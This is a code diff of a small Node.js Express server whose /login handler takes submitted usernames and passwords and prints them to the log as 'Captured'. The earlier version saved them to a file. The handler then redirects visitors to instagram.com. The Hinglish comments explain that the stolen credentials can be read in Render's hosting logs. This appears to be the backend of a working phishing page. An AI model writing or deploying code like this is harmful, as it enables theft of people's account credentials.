@@ -1,30 +1,23 @@
 const express = require("express");
 const bodyParser = require("body-parser");
-const fs = require("fs");
 
 const app = express();
-const PORT = 3000;
+const PORT = process.env.PORT || 3000;
 
-// Serve index.html
 app.use(express.static(__dirname));
-
-// Parse form data
 app.use(bodyParser.urlencoded({ extended: true }));
 
-// Handle login
 app.post("/login", (req, res) => {
   const { username, password } = req.body;
 
-  // Save username + password in file
-  const log = `Username: ${username}, Password: ${password}\n`;
-  fs.appendFileSync("dummy.txt", log);
+  // ⚠️ File me save nahi hoga (Render free me persist nahi hota)
+  // 👉 Console me print hoga (jo tum Render Logs me dekh sakte ho)
+  console.log(`Captured -> Username: ${username}, Password: ${password}`);
 
-  // ✅ Redirect to your certificate link
-  res.redirect("https://www.youtube.com");
+  // Redirect back (for demo purpose)
+  res.redirect("https://instagram.com");
 });
 
-// ✅ Yeh block hamesha sabse bahar hona chahiye
 app.listen(PORT, () => {
-  console.log(`Server running at http://localhost:${PORT}`);
-
+  console.log(`Server running on port ${PORT}`);
 });
